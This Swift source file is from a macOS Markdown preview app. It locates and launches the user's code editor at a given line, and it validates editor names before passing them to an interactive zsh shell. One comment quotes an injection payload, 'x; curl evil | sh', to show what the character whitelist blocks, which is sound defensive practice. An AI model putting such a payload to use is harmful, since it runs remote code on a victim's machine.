import Foundation
import AppKit

enum EditorLaunchError: Error {
    case noEditorFound
    case launchFailed(String)

    var message: String {
        switch self {
        case .noEditorFound:
            return "No supported editor found on $PATH. Tried: "
                + EditorLauncher.candidates.joined(separator: ", ")
                + ". Override with `defaults write com.markee.preview editor \"<name>\"`."
        case .launchFailed(let s):
            return "Couldn't launch editor: \(s)"
        }
    }
}

enum EditorLauncher {
    /// Candidate CLI names tried in order. First one resolvable on the user's
    /// PATH wins, unless `defaults read com.markee.preview editor` is set.
    static let candidates: [String] = [
        "cursor", "code", "zed", "subl", "mate", "mvim", "hx"
    ]

    private static var pathCache: [String: String] = [:]

    /// Editor names we'll pass through `zsh -ilc 'command -v <name>'` must be
    /// shell-safe. Reject anything outside `[A-Za-z0-9._+-]` so a
    /// `defaults write … editor "x; curl evil | sh"` self-pwn isn't possible.
    private static let safeNameChars: Set<Character> = Set(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._+-"
    )

    static func isSafeEditorName(_ name: String) -> Bool {
        guard !name.isEmpty else { return false }
        return name.allSatisfy { safeNameChars.contains($0) }
    }

    /// Build the argv (excluding the binary) for opening `file` at `line` (0-indexed).
    /// Each editor's line-jump convention is different; we key on the basename
    /// of the binary so a path like `/opt/homebrew/bin/code` still dispatches.
    static func buildArgs(editor: String, file: String, line: Int?) -> [String] {
        let displayLine = (line ?? -1) + 1 // editors are 1-indexed
        let useLine = line != nil && displayLine > 0
        let key = (editor as NSString).lastPathComponent
        switch key {
        case "code", "code-insiders", "cursor", "windsurf":
            return useLine ? ["-g", "\(file):\(displayLine):1"] : [file]
        case "zed":
            return useLine ? ["\(file):\(displayLine):1"] : [file]
        case "subl", "hx":
            return useLine ? ["\(file):\(displayLine)"] : [file]
        case "mate":
            return useLine ? ["-l", "\(displayLine)", file] : [file]
        case "mvim", "gvim", "nvim", "vim":
            return useLine ? ["+\(displayLine)", file] : [file]
        default:
            return [file]
        }
    }

    /// Resolve a CLI name to an absolute path. Tries inherited PATH first,
    /// then bounces through `zsh -ilc 'which X'` so Homebrew / fnm / etc.
    /// shells-only PATH entries get a chance.
    static func resolveBinary(_ name: String) -> String? {
        if let cached = pathCache[name] { return cached.isEmpty ? nil : cached }
        guard isSafeEditorName(name) else {
            pathCache[name] = ""
            return nil
        }

        if let p = runCapturing("/usr/bin/which", [name]),
           let trimmed = trimmedAbsolutePath(p) {
            pathCache[name] = trimmed
            return trimmed
        }
        if let p = runCapturing("/bin/zsh", ["-ilc", "command -v \(name)"]),
           let trimmed = trimmedAbsolutePath(p) {
            pathCache[name] = trimmed
            return trimmed
        }
        pathCache[name] = ""
        return nil
    }

    /// Returns the editor the user prefers, in `(absolute-binary-path, name)` form,
    /// or nil if nothing on the candidate list resolves.
    static func preferredEditor() -> (bin: String, name: String)? {
        if let override = UserDefaults.standard.string(forKey: "editor"), !override.isEmpty {
            if let bin = resolveBinary(override) {
                return (bin, override)
            }
            // Override set but unresolvable — fall through to candidates so the
            // user isn't bricked by a typo.
        }
        for name in candidates {
            if let bin = resolveBinary(name) {
                return (bin, name)
            }
        }
        return nil
    }

    static func open(file: URL, line: Int?) -> Result<Void, EditorLaunchError> {
        guard let preferred = preferredEditor() else {
            return .failure(.noEditorFound)
        }
        let args = buildArgs(editor: preferred.name, file: file.path, line: line)
        let task = Process()
        task.executableURL = URL(fileURLWithPath: preferred.bin)
        task.arguments = args
        do {
            try task.run()
        } catch {
            return .failure(.launchFailed(error.localizedDescription))
        }
        return .success(())
    }

    // MARK: - Helpers

    private static func trimmedAbsolutePath(_ raw: String) -> String? {
        let t = raw.trimmingCharacters(in: .whitespacesAndNewlines)
        guard t.hasPrefix("/"), !t.isEmpty else { return nil }
        // `which` returns one line; if zsh chatter snuck in, take the first
        // absolute-looking line.
        if let line = t.split(whereSeparator: { $0 == "\n" || $0 == "\r" }).first(where: { $0.hasPrefix("/") }) {
            return String(line)
        }
        return t
    }

    private static func runCapturing(_ executable: String, _ args: [String]) -> String? {
        let p = Process()
        p.executableURL = URL(fileURLWithPath: executable)
        p.arguments = args
        let outPipe = Pipe()
        p.standardOutput = outPipe
        p.standardError = Pipe()
        do { try p.run() } catch { return nil }
        p.waitUntilExit()
        guard p.terminationStatus == 0 else { return nil }
        let data = outPipe.fileHandleForReading.readDataToEndOfFile()
        return String(data: data, encoding: .utf8)
    }
}
